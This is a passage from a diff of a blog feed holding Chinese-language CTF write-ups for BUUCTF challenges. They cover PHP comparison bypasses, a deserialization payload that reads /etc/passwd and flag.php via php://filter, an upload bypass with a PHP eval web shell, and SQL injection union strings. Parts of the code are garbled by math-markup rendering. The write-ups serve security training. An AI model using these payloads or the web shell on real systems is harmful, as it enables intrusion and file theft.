class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;gg) &amp;amp;&amp;amp; $id !== gg) {
-        echo &#39;You got the first step&#39;;
-        if(isset(_POST[‘passwd’])) {&lt;br&gt;
-&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;passwd=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_POST[‘passwd’];&lt;br&gt;
-if (!is_numeric(passwd))
-            {
-                 if(passwd==1234567)&lt;br&gt;
-{&lt;br&gt;
-echo ‘Good Job!’;&lt;br&gt;
-highlight_file(‘flag.php’);&lt;br&gt;
-die(‘By Retr_0’);&lt;br&gt;
-}&lt;br&gt;
-else&lt;br&gt;
-{&lt;br&gt;
-echo “can you think twice??”;&lt;br&gt;
-}&lt;br&gt;
-}&lt;br&gt;
-else{&lt;br&gt;
-echo ‘You can not get it !’;&lt;br&gt;
-}&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;    &amp;#125;
-    else&amp;#123;
-        die(&#39;only one way to get the flag&#39;);
-    &amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;}&lt;br&gt;
-else {&lt;br&gt;
-echo “You are not a real hacker!”;&lt;br&gt;
-}&lt;br&gt;
-}&lt;br&gt;
-else{&lt;br&gt;
-die(‘Please input first’);&lt;br&gt;
-}&lt;br&gt;
-}Please input first&lt;br&gt;
- 三个参数：gg&amp;amp;&amp;amp;id&amp;amp;&amp;amp;passwd, 第一二个是数组绕过（因为是强相等）&lt;/p&gt;
-&lt;p&gt;passwd 是弱比较（1234567qhwjhiquwf）获得 flag&lt;/p&gt;
-&lt;h2 id=&#34;网鼎杯-2020-青龙组areuserialz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网鼎杯-2020-青龙组areuserialz&#34;&gt;#&lt;/a&gt; [网鼎杯 2020 青龙组] AreUSerialz&lt;/h2&gt;
-&lt;p&gt;在反序列化的过程中，调用__destruct 析构方法&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;function  __destruct() &amp;#123;  
-if($this-&amp;gt;op === &amp;quot;2&amp;quot;)   
-$this-&amp;gt;op = &amp;quot;1&amp;quot;;  
-$this-&amp;gt;content = &amp;quot;&amp;quot;;
-$this-&amp;gt;process();&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code&gt;public  function` `process() &amp;#123;
-  if($this-&amp;gt;op == &amp;quot;1&amp;quot;) &amp;#123;
-    $this-&amp;gt;write();
-  &amp;#125; else if($this-&amp;gt;op == &amp;quot;2&amp;quot;) &amp;#123;
-    $res= $this-&amp;gt;read();
-    $this-&amp;gt;output($res);
-  &amp;#125; else&amp;#123;
-    $this-&amp;gt;output(&amp;quot;Bad Hacker!&amp;quot;);
-  &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;查看代码可以看出来，GET 方式传入序列化的 str 字符串，str 字符串中每一个字符的 ASCII 范围在 32 到 125 之间，然后对其反序列化。&lt;/p&gt;
-&lt;p&gt;如果 op===“2”，将其赋为 &amp;quot;1&amp;quot;，同时 content 赋为空，进入 process 函数，需要注意到的地方是，这里 op 与 &amp;quot;2&amp;quot; 比较的时候是强类型比较&lt;/p&gt;
-&lt;p&gt;进入 process 函数后，如果 op==“1”，则进入 write 函数，若 op==“2”，则进入 read 函数，否则输出报错，可以看出来这里 op 与字符串的比较变成了弱类型比较 ==。&lt;/p&gt;
-&lt;p&gt;所以我们只要令 op=2, 这里的 2 是整数 int。当 op=2 时，op===&amp;quot;2&amp;quot; 为 false，op==&amp;quot;2&amp;quot; 为 true，接着进入 read 函数&lt;/p&gt;
-&lt;p&gt;整个利用思路就很明显了，还有一个需要注意的地方是，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;op,&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;filename,$content 三个变量权限都是 protected，而&lt;/p&gt;
-&lt;h4 id=&#34;protected权限的变量在序列化的时会有0000字符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#protected权限的变量在序列化的时会有0000字符&#34;&gt;#&lt;/a&gt; protected 权限的变量在序列化的时会有 %00*%00 字符，&lt;/h4&gt;
-&lt;p&gt;%00 字符的 ASCII 码为 0，就无法通过上面的 is_valid 函数校验。&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1828215/202005/1828215-20200512095733036-1748012487.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在这里有几种绕过的方式，简单的一种是：php7.1 + 版本对属性类型不敏感，本地序列化的时候将属性改为 public 进行绕过即可&lt;/p&gt;
-&lt;p s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php:filterread=&#34;convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;&#34;&gt;paylaod:?str=O:11:%22FileHandler%22:3:&lt;/p&gt;
-&lt;p&gt;比赛的时候还有相对路径和绝对路径的问题，需要拿到绝对路径才能读取 flag&lt;/p&gt;
-&lt;p&gt;可以先尝试读取 /etc/passwd 检验自己的 payload 是否正确，然后再读取服务器上的配置文件，猜出 flag.php 所在的绝对路径，再将其读取。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&amp;#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:60:%22php://filter/read=convert.base64-encode/resource=/etc/passwd%22;s:7:%22content%22;N;&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;下面这个 payload 是比赛的时候用的，buuoj 上环境路径不一样。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&amp;#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:67:%22php://filter/read=convert.base64-encode/resource=/web/html/flag.php%22;s:7:%22content%22;N;&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;gxyctf2019babyupload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019babyupload&#34;&gt;#&lt;/a&gt; [GXYCTF2019]BabyUpload&lt;/h2&gt;
-&lt;h3 id=&#34;image-20240426201402591&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#image-20240426201402591&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426201402591.png&#34; alt=&#34;image-20240426201402591&#34;&gt;&lt;/h3&gt;
-&lt;p&gt;1.&lt;img data-src=&#34;https://img-blog.csdnimg.cn/2021070719261872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNzAyOTgx,size_16,color_FFFFFF,t_70&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 先写一下.htaccess 和 user.ini 两个配置文件，会发现&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426202003132.png&#34; alt=&#34;image-20240426202003132&#34;&gt;&lt;/p&gt;
-&lt;p&gt;所以要改一下，SetHandler application/x-httpd-php 这样写&lt;/p&gt;
-&lt;h4 id=&#34;3要改content-typeimagejpeg是图片的样式applicationoctet-stream是php样式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3要改content-typeimagejpeg是图片的样式applicationoctet-stream是php样式&#34;&gt;#&lt;/a&gt; 3. 要改 Content-Type:image/jpeg 是图片的样式，application/octet-stream 是 php 样式。&lt;/h4&gt;
-&lt;p&gt;4. 过滤 &amp;lt;? 可以用 JS 辅助写一句话木马&lt;/p&gt;
-&lt;script language=&#34;php&#34;&gt;@eval($_POST[aaa]);&lt;/script&gt;
-&lt;p&gt;蚁剑连接查看。&lt;/p&gt;
-&lt;h2 id=&#34;buuctf-gxyctf2019babysqli-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuctf-gxyctf2019babysqli-1&#34;&gt;#&lt;/a&gt; BUUCTF [GXYCTF2019]BabySQli 1&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/img_convert/6a38d3e45f32eceef1727c3a2b07aea9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;burp 抓包：初看应该是 sql 注入&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/img_convert/87b8cc9d7c33f114c34c155c5bfe169c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;找到隐藏信息，双重加密，base32 解码后再 base64 解码，&lt;/p&gt;
-&lt;p&gt;得到 select * from user where username = ‘$name’&lt;/p&gt;
-&lt;p&gt;找到注入点，可以知道 $name 是参数，并且就是第一个输入的值&lt;/p&gt;
-&lt;p&gt;万能钥匙不能直接进去，换成 0‘ ||TRUE# 不能用（显示密码错误） 换个角度，联合注入 1’‘ unoin select 1,2# 发现报错列数错了加一个 1’‘ unoin select 1,2,3# 显示 wrong user 一个一个试将那个 $name = 数组的那个&lt;/p&gt;
-&lt;p&gt;发现是第二个&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/img_convert/7b865fe304a063e64dceb70d90e59afb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;找到&lt;/p&gt;
-&lt;p&gt;if($arr[1] == “admin”)&lt;/p&gt;
-&lt;p&gt;{ 		if(md5($password) == $arr[2])&lt;/p&gt;
-&lt;p echo=&#34;&#34; $flag;=&#34;&#34;&gt;​                  &lt;/p&gt;
-&lt;p&gt;​             else{ 			die(“wrong pass!”); 		} 	}&lt;/p&gt;
-&lt;p&gt;换种方式猜测&lt;br&gt;
- username 数据表里面的 3 个字段分别是 flag、name、password。&lt;br&gt;
-猜测只有 password 字段位 NULL&lt;br&gt;
- 咱们给参数 password 传入的值是 123&lt;br&gt;
- 那么传进去后，后台就会把 123 进行 md5 值加密并存放到 password 字段当中&lt;br&gt;
-当我们使用查询语句的时候&lt;br&gt;
-我们 pw 参数的值会被 md5 值进行加密&lt;br&gt;
-然后再去与之前存入 password 中的 md5 值进行比较&lt;br&gt;
-如果相同就会输出 flag&lt;/p&gt;
-&lt;p&gt;爆 flag：&lt;/p&gt;
-&lt;p&gt;这里 pw 参数的值为 123456&lt;br&gt;
- 可以随便传&lt;br&gt;
-但是要对传入的那个值进行 md5 值加密&lt;br&gt;
-网上可以随便找一个在线 md5 加密平台&lt;/p&gt;
-&lt;p&gt;1’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’#&lt;br&gt;
-123456&lt;br&gt;
-[GYCTF2020]Blacklist 1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240426210530825.png&#34; alt=&#34;image-20240426210530825&#34;&gt;&lt;/p&gt;
-&lt;p&gt;注入点尝试 1’出错了就是‘&lt;/p&gt;
-&lt;p&gt;union select 发现正则匹配 select 被过滤，直接双写看看可以不可以，发现不可以&lt;/p&gt;
-&lt;h3 id=&#34;知识点handler语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点handler语法&#34;&gt;#&lt;/a&gt; 知识点：Handler 语法&lt;/h3&gt;
-&lt;p&gt;handler 语句，一行一行的浏览一个表中的数据&lt;/p&gt;
-&lt;p&gt;handler 语句并不具备 select 语句的所有功能。&lt;/p&gt;
-&lt;p&gt;mysql 专用的语句，并没有包含到 SQL 标准中。&lt;br&gt;
-HANDLER 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。&lt;/p&gt;
-&lt;p&gt;1、HANDLER tbl_name OPEN&lt;/p&gt;
-&lt;p&gt;打开一张表，无返回结果，实际上我们在这里声明了一个名为 tb1_name 的句柄。&lt;/p&gt;
-&lt;p&gt;2、HANDLER tbl_name READ FIRST&lt;/p&gt;
-&lt;p&gt;获取句柄的第一行，通过 READ NEXT 依次获取其它行。最后一行执行之后再执行 NEXT 会返回一个空的结果。&lt;/p&gt;
-&lt;p&gt;3、HANDLER tbl_name CLOSE&lt;/p&gt;
-&lt;p&gt;关闭打开的句柄。&lt;/p&gt;
-&lt;p&gt;4、HANDLER tbl_name READ index_name = value&lt;/p&gt;
-&lt;p&gt;通过索引列指定一个值，可以指定从哪一行开始，通过 NEXT 继续浏览。&lt;/p&gt;
-</content>
-        <category term="buuctf" />
-        <updated>2024-04-28T14:48:23.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/04/28/1_1/</id>
